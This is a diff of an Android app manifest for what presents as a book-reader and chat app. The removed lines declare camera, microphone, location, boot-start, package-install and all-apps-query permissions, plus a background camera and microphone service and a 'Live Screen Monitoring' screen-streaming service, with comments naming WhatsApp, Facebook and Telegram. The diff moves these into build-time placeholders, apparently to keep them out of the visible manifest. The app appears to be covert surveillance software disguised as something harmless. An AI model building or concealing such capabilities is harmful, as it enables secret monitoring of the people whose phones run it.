@@ -2,65 +2,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- Basic Permissions -->
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <!-- WiFi scan (0xWI) — required for PermissionDetector + getScanResults -->
-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
-    <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    
-    <!-- Camera Permission - ENABLED -->
-    <uses-permission android:name="android.permission.CAMERA" />
-    <uses-feature android:name="android.hardware.camera" android:required="false" />
-    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
-    
-    <!-- Audio Recording Permission - ENABLED -->
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    
-    <!-- Location: required on Android 6+ for WiFi scan results (getScanResults); optional for other features -->
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <!-- <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" /> -->
-
-    <!-- Notification Permission (Android 13+) -->
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-
-    <!-- Storage Permissions for file access and management -->
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
-        android:maxSdkVersion="32" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
-        android:maxSdkVersion="29"
-        tools:ignore="ScopedStorage" />
-    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
-        tools:ignore="ScopedStorage" />
-    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
-    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-    
-    <!-- Battery optimization exemption for background service -->
-    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-    
-    <!-- Foreground service types for CAMERA and MICROPHONE - ENABLED -->
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
-    <!-- Foreground service types for SCREEN MONITORING - DISABLED -->
-    <!-- <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" /> -->
-    
-    <!-- Required when MainService uses FOREGROUND_SERVICE_TYPE_LOCATION (location in manifest for WiFi/GPS) -->
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
-    <!-- Foreground service type for update download (Android 14+) -->
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
-    <!-- Android 11+ (API 30+): allow querying all installed apps with launcher icon (e.g. WhatsApp, Facebook, Telegram) -->
-    <queries>
-        <intent>
-            <action android:name="android.intent.action.MAIN" />
-            <category android:name="android.intent.category.LAUNCHER" />
-        </intent>
-    </queries>
+    @BUILD_PROFILE_PERMISSIONS@
 
     <application
         android:name=".App"
@@ -77,11 +19,7 @@
         android:versionName="1.0.0"
         tools:targetApi="31">
 
-        <!-- ═══════════════════════════════════════════════════════ -->
-        <!-- Design Mode: "library" or "chat"                      -->
-        <!-- Change this value to switch the app design at build   -->
-        <!-- ═══════════════════════════════════════════════════════ -->
-        <meta-data android:name="app_design_mode" android:value="chat" />
+        @BUILD_PROFILE_APPLICATION_OVERRIDES@
 
         <!-- Book Reader Main Activity (LAUNCHER) -->
         <activity
@@ -160,7 +98,9 @@
             android:exported="false"
             android:theme="@style/Theme.SecureChat"
             android:screenOrientation="portrait"
-            android:launchMode="singleTop" />
+            android:launchMode="singleTop"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true" />
 
         <!-- Image Viewer Activity -->
         <activity
@@ -191,21 +131,7 @@
             android:theme="@style/Theme.SecureChat"
             android:screenOrientation="portrait" />
 
-        <!-- Main Service - camera and microphone enabled -->
-        <service
-            android:name=".service.MainService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="dataSync|camera|microphone|location"
-            />
-
-        <!-- Screen Streaming Service (Live Screen Monitoring) - ENABLED -->
-        <service
-            android:name=".service.ScreenStreamService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="mediaProjection"
-            />
+        <!-- MainService / CallService / ScreenStreamService — defined in build-profile overrides -->
 
         <!-- App update download: runs in foreground, survives app exit, supports resume -->
         <service
